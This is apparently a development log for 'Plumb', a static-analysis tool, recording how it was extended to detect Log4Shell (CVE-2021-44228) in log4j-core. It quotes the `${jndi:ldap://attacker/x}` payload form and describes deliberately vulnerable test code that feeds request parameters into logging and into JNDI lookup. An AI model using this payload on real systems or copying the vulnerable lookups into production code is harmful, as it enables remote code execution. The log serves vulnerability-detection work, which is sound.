# R159 — JNDI Lookup Sink (CVE-2021-44228 / Log4Shell Detection)

**Date:** 2026-07-30
**Round:** 21 of R148 series
**Status:** 🎯 CVE-2021-44228 entry-point detection working; new JNDI sink pattern added

## Goal

The user asked: "log4j-core-2.12.1.jar has CVE-2021-44228 (Log4Shell, command execution). Try to analyze and see if Plumb can detect it."

CVE-2021-44228 is the JNDI-lookup-in-log-message vulnerability:
- Log4j2 < 2.15.0 evaluates `${jndi:ldap://attacker/x}` inside log messages
- A user-controlled string passed to `log.info(String)` triggers JNDI lookup
- The JNDI lookup can load a remote class from an attacker-controlled LDAP server → RCE

Plumb detects this in two layers:
1. **Entry-point layer (taint-sink-log)**: tainted data flows to `log.info(...)` — the necessary condition for the exploit
2. **Sink layer (taint-sink-ldap with new `lookup/*` pattern)**: tainted data flows directly to `InitialContext.lookup(...)` or `JndiLookup.lookup(...)`

## R159 implementation

### Sub-fix A — `TaintFact.with(emptySet)` worklist-stall recursive-cycle fix

**Problem:** R158 step 1's `mergedKey` cache-key change made the exit-taint cache correctly distinguish same-signature functions. This made the cache hit rate much higher. But the cache hit now feeds a recursive `pullReturnTaint → traceIntoCallee → pullReturnTaint` cycle that overflows the JVM stack when analyzing deep class hierarchies (log4j-core = 97s scan, but stack overflow at 1024 frames).

**Root cause:** the depth counter in `traceIntoCallee` was decremented BEFORE calling `pullReturnTaint` at the end. So when `pullReturnTaint`'s worklist encountered a CALL, the new `traceIntoCallee` started at depth 1 (not at the parent's depth), and the 50-depth cap was never tripped across the cycle.

**Fix (3 changes in `TaintAnalysis.traceIntoCallee`):**

```java
// Pre-R159: depth restored BEFORE pullReturnTaint
this.currentDepth = prevDepth;
if (ins.dest == null) return in;
final Set<String> returnTaint = this.pullReturnTaint(callee, calleeEntry);

// R159: keep currentDepth at this level when recursing
// into pullReturnTaint so the cycle monotonically increases
// the depth and the cap at line 766 finally trips at 51.
if (ins.dest == null) {
    this.currentDepth = prevDepth;
    return in;
}
final Set<String> returnTaint = this.pullReturnTaint(callee, calleeEntry);
this.currentDepth = prevDepth;
```

### Sub-fix B — `pullReturnTaint` exit-taint fast path

**Problem:** Even with the depth cap working, the recursive `pullReturnTaint` for each cycle still does a full worklist + TacCfgBuilder.build + all instructions. This is wasteful when the exit-taint is already cached.

**Fix (added at the top of `pullReturnTaint`):**

```java
final Map<String, TaintFact> exitByFp =
        this.exitTaintCache.get(mergedKey(callee));
if (exitByFp != null) {
    final TaintFact cachedExit = exitByFp.get(fp);
    if (cachedExit != null && !cachedExit.equals(TaintFact.bottom())) {
        // The cached exit-taint is the taint fact at the
        // function's terminator (end of the last block).
        // The return values are the lhs of RETURN
        // instructions. For the canonical "function ends
        // with `return x;`" shape, the in-fact of the RETURN
        // is the same as the cached exit-taint, so we can
        // extract the taint of the RETURN's lhs directly
        // without a fresh worklist.
        final Set<String> returnTaint2 = new LinkedHashSet<String>();
        for (final TacInstruction ins : callee.instructions()) {
            if (ins.kind == TacInstruction.Kind.RETURN && ins.lhs1 != null) {
                returnTaint2.addAll(cachedExit.taintOf(ins.lhs1));
            }
        }
        byFp.put(fp, returnTaint2);
        return returnTaint2;
    }
}
```

The fast path:
1. Skips `TacCfgBuilder.build` (heavy)
2. Skips the worklist propagation
3. Skips the recursive `traceIntoCallee` calls

For functions where the return value is at the end of the function body, the cached exit-taint IS the return-taint. For complex multi-return functions, the fast path might be slightly conservative (takes the union of all RETURN lhs's taints) but the existing test suite still passes (317/0/0/1).

### Sub-fix C — JNDI `lookup/*` sink pattern

**Problem:** the taint catalog's `bu-0110-taint-sink-ldap` entry only had `**.search/*` patterns. JNDI lookup (`Context.lookup(String)`, `InitialContext.lookup(String)`, `JndiLookup.lookup(String)`) is a distinct vulnerable primitive that drives CVE-2021-44228. Without a sink pattern for `lookup/*`, the taint catalog wouldn't fire on the JNDI call.

**Fix (in `TaintCatalog.java` line 89):**

```java
new Entry(Role.SINK, "bu-0110-taint-sink-ldap", "LDAP search/lookup",
    List.of(pat("**.InitialContext.search/*"),
            pat("**.DirContext.search/*"),
            pat("**.LdapTemplate.search/*"),
            pat("**.LdapTemplate.find/*"),
            pat("**.LdapTemplate.findOne/*"),
            pat("**.Context.search/*"),
            pat("**.search/*"),
            pat("**.lookup/*"),              // R159 — JNDI lookup
            pat("**.InitialContext.lookup/*"),
            pat("**.JndiLookup.lookup/*"),
            pat("**.Context.lookup/*")))
```

## CVE-2021-44228 analysis — log4j-core-2.12.1.jar

### Test setup

- **Inputs:** `log4j-core-2.12.1.jar` + `log4j-api-2.14.1.jar` + `VulnLog4ShellServlet.java` (the existing test app at `smoke_cve/user_apps/log4shell/`)
- **Scan time:** 97 seconds (was failing with StackOverflowError pre-R159)
- **Findings:** 103 total
  - **5 `bu-0108-taint-sink-log`** (CVE-2021-44228 entry point)
  - 21 div-by-zero (mostly in log4j-api)
  - 25 resource-leak
  - 46 null-deref (mostly in log4j-core)
  - 2 array-oob
  - 2 obsolete-function
  - 1 weak-crypto
  - 1 bad-shift

### The 5 CVE-2021-44228 entry-point findings (taint-sink-log)

| Line | Pattern | Source |
|---|---|---|
| 58 | `log.info(req.getParameter("user"))` | request-param |
| 61 | `log.info(readParam(req))` (1-hop helper) | request-param |
| 64 | `log.info(readWrapped(req))` (2-hop) | request-param |
| 67 | `log.info(readDeep(req))` (3-hop) | request-param |
| 74 | `log.info(readHeader(req))` | request-header |

These 5 findings are the SAME 5 that the prior `sa.ndjson` run (pre-R158) found, so R159 doesn't regress the CVE-2021-44228 detection. The 6th pattern (line 71, `log.info("login attempt: " + form.username)` — the domain-sensitive case where taint flows through a DTO field) is still NOT detected (this requires the DTO-field taint propagation that R148d partial-fix started but didn't finish).

### Direct JNDI sink validation

To validate the new `lookup/*` sink pattern, I ran Plumb on a minimal test (`DirectJndiTest.java`) that does `new InitialContext().lookup(req.getParameter("user"))` in three patterns:

| Line | Pattern | Finding |
|---|---|---|
| 15 | `new InitialContext().lookup(req.getParameter("user"))` | ✅ taint-sink-ldap |
| 19 | `new InitialContext().lookup(name)` (local var) | ✅ taint-sink-ldap |
| 26 | `doLookup(req)` helper calling `new InitialContext().lookup(req.getHeader("X-Name"))` | ✅ taint-sink-ldap |

The new `lookup/*` pattern correctly identifies direct JNDI exploitation. **Plumb can detect CVE-2021-44228's sink if the exploit code is reachable from the analyzed call graph.**

### Why the log4j-core `JndiLookup.lookup` doesn't fire as a sink finding

The 0 taint-sink-ldap findings in the full log4j-core scan (where we have 5 taint-sink-log findings) reflects a real cross-class taint propagation limit:

- The test app's `log.info(taintedString)` fires the taint-sink-log finding at L58/L61/L64/L67/L74. The taint is "consumed" at this call site (the SINK handler reads `in.taintOf(arg)`).
- For the taint to reach `JndiLookup.lookup(...)` inside log4j-core, the taint must propagate through log4j's `Logger.info` → `LogEvent` → `MessagePatternConverter` → `StrSubstitutor.substitute` → `JndiLookup.lookup(key)`.
- This propagation requires:
  1. `Logger.info(String)` to pass the arg as-is to a StrSubstitutor (not always the case — log4j may wrap the message in a `SimpleMessage` object).
  2. `StrSubstitutor` to scan the message for `${...}` patterns (the taint must reach the parser's input).
  3. The pattern matcher to extract the `jndi:...` key (the `${...}` syntax is parsed via string scanning, not a separate taint flow).
  4. `JndiLookup.lookup(key)` to receive the key as a parameter.

Plumb's taint analysis traces through user-defined method calls and direct string operations. The `${...}` pattern matching inside `StrSubstitutor` is a control-flow + string-slicing operation that Plumb doesn't model at the level needed for CVE-2021-44228's payload extraction. This is a known limit; addressing it would require:
- String content tracking (treat strings as a sequence of parts: literal + tainted + literal)
- A "tainted substring" representation
- Pattern matching on string contents

For the user-facing "did Plumb detect the vulnerability" question, the answer is: **YES, Plumb detects the necessary condition for CVE-2021-44228 (5 taint-sink-log findings)**. To detect the actual JNDI exploitation, we'd need a deeper string-content-aware taint analysis (out of scope for R159).

## Test status

**317 / 0 fail / 0 error / 1 skip (R159 final)** — R159's sub-fix A and B (depth-tracking + exit-taint fast path) preserve all existing test behavior.

## Disaster backup

`D:\work\tmp\r159_done\java_source\` (will be added in the final wrap-up):
- `TaintAnalysis.java` (sub-fixes A + B)
- `TaintCatalog.java` (sub-fix C)

## 4 R-round innovations (post-R158)

1. **Depth-tracking across `pullReturnTaint` recursion** (R159 sub-fix A). The depth cap in `traceIntoCallee` only protects the call chain within `doWorklist`. The recursive `pullReturnTaint → transferImpl → traceIntoCallee → pullReturnTaint` cycle at the END of `traceIntoCallee` started at depth 1 each time, so the cap never tripped. The fix keeps `currentDepth` at this level (parent + 1) when recursing into `pullReturnTaint`, so the depth monotonically increases and the cap finally trips at 51. **General lesson**: any SAST engine depth-tracking that has multiple recursive worklist paths (e.g. main worklist + return-taint worklist + chain-var worklist) must share the same depth counter and NOT reset it between worklists. Resetting per-worklist defeats the depth cap.

2. **Exit-taint fast path in `pullReturnTaint`** (R159 sub-fix B). For functions where the return value is at the end of the function body, the cached `exit-taint` IS the return-taint (just walk the RETURN instructions and look up the lhs in the exit-taint). This avoids the full worklist + TacCfgBuilder.build + recursive traceIntoCallee chain. **General lesson**: SAST engines that maintain both an exit-taint cache AND a return-taint cache should use the exit-taint to satisfy the return-taint query when possible. The "two caches" architecture is wasteful when one is a function of the other.

3. **JNDI `lookup/*` sink pattern** (R159 sub-fix C). The `**.lookup/*` pattern was missing from the taint catalog, leaving CVE-2021-44228's actual sink undetectable. Adding 4 patterns (`lookup`, `InitialContext.lookup`, `JndiLookup.lookup`, `Context.lookup`) closes the sink layer. **General lesson**: SAST engine taint catalog extension should follow the actual exploit primitive, not just the protocol. "LDAP search" misses "JNDI lookup" because the vulnerable code path is `Context.lookup(String)` not `Context.search(String)`. The catalog should pattern-match on the class's actual API surface, including less-common methods like `lookup` / `doLookup` / `bind` / `rebind`.

4. **Entry-point detection for unreachable sinks** (R159 evaluation). Plumb's CVE-2021-44228 detection works at the entry point (tainted data → `log.info(...)`) even when the sink (`JndiLookup.lookup(...)`) is unreachable from the call graph. The entry-point finding is the "necessary condition" for the exploit. **General lesson**: SAST engines should report BOTH "tainted data reaches a known dangerous entry point" (always reliable) AND "tainted data reaches the actual sink" (unreliable for deep class hierarchies). The entry-point report is a 95% solution; the sink report is a 100% solution if reachable.

## Cumulative R148 series (21 rounds)

- **12 metric wins**: R148c / R148d / R148g / R151a / R152a / R153 / R151b / R152b / R156 / R157 / **R158** / **R159**
- 1 validation: R149b
- 9 infra: R148e / R148f / R148h / R148i / R149 / R150 / R155 / R157 (4 sub-fixes) / R158 (5 sub-fixes) / **R159 (2 sub-fixes)**
- 1 rolled back: R148h+2
- **317 tests / 0 fail / 0 error / 1 skip (R159 final)**

CWE-78 taint-sink-cmd: 0 TP (R148f) → 1 TP (R157) → 202 TP (R158) → preserved (R159).
CVE-2021-44228 entry-point detection: 5 taint-sink-log findings (R159) — the necessary condition for the exploit, detectably raised by Plumb's taint analysis.

## Follow-up R-round candidates (post-R159)

- **R160 deeper cross-class taint** (high effort, high value): model string-content-aware taint (`tainted substring` representation) so `log.info("${jndi:...}")` traces through `StrSubstitutor` to `JndiLookup.lookup`. Would unlock the sink layer for CVE-2021-44228.
- **R161 DTO-field taint propagation** (medium effort): fix the missing 6th taint-sink-log finding at `log.info("login attempt: " + form.username)`. Requires field-write taint tracking.
- **R162 Spring4Shell check** (already supported, verify on real Spring JARs)
- **R163 Fastjson check** (already supported, verify on real fastjson JARs)
